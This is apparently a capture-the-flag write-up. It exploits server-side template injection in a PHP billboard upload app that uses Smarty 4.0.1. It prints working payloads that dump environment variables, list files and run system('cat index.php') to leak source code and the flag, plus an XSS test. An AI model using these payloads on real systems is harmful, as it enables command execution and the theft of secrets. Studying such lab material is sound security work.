# Billboard Mayhem

## The App
This execise contains 2 Flags. The first one is just finding the form (wow, complicated), the second seems to be hidden in environment variables.

![[app.png]]

As stated, it can upload TPL files (seems to be a file format for a marketing and CRM software https://www.act.com/resources/downloads/ and https://file.org/extension/tpl)?

## Research
First, I tried to upload a file with the `.tpl` extension an a random content I can identify. It triggers a  `POST` to `/upload.php` and then redirects with `302 Found` to the `/index.php`, where the file content is diplayed. I tried to reload the page but the file content is always diplayed so it is persistend. Uploading the file a second time changes the output. Uploading a different file changes the content again.

Then I tried to upload a valid PHP file, and here it starts to become interesting:

```php
<?php

echo "<br><script>alert(window.location.href)</script>";
```

Becomes:

```html
<!--?php

echo "<br--><script>alert(window.location.href)</script>";
```

```php
<?php

echo 1+1;

```

Becomes:

```html
<!--?php

echo 1+1;
</div-->
```

After some more experiments `<div class="test">{7*7}</div>` became `<div class="test">49</div>`, which means that there exists a SSTI (Server Side Template Injection).

The following payload reveals some usefull information:
```
<div class="test">{join('<br>', array_keys(getenv()))} <br>-<br> {join('<br>', getenv())}<br>Exposed files<br>{join(';', glob('*'))}</div>
```

```
HOSTNAME  
HOME  
PATH  
CHALLENGE_USER  
DEBIAN_FRONTEND  
EXPOSED_URL  
PWD  
-  
0eb55f8a28f4  
/var/www  
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin  
Spikezz0xF69sh  
noninteractive  
https://64bcca024aabaf144162740a78807d83.challenge.hackazon.org  
/  
Exposed files  
advertisement.tpl;billboard.tpl;index.php;smarty-4.0.1;templates_c;upload.php;upload.tpl
```

After googleing the unknown file or folder `smarty-4.0.1` we find a PHP library with this name. A template engine. https://www.smarty.net/. 

Digging deeper, the `templates_c` folder reveals the following content:

```
templates_c/8adfbabda06f8aba0b4b1d80c38a9737372bc06b_0.file.billboard.tpl.php
templates_c/b313a41804d60e60e349bb7b8c613386fcae54d9_0.file.upload.tpl.php
templates_c/dc37bb02e243b748b086ec9c23e78188c36d4887_0.file.advertisement.tpl.php
```

The template files are accessible on the server and can be downloaded by calling their files. The source code if PHP can be leaked with the payload `<div class="test">{system('cat index.php')}</div>`. By accident, this revealed the flag.

Leaked code:

```html
<div class="test"><!--?php
require('smarty-4.0.1/libs/Smarty.class.php');
$smarty = new Smarty;
$smarty--->disableSecurity();
$smarty-&gt;assign('flag', 'Congratulations, the flag is: CTF{example_flag}');
$smarty-&gt;display('billboard.tpl');
?&gt;
?&gt;</div>
```

## Alternative solution
The template engine seems to have some sort of environment variable which might be accessible.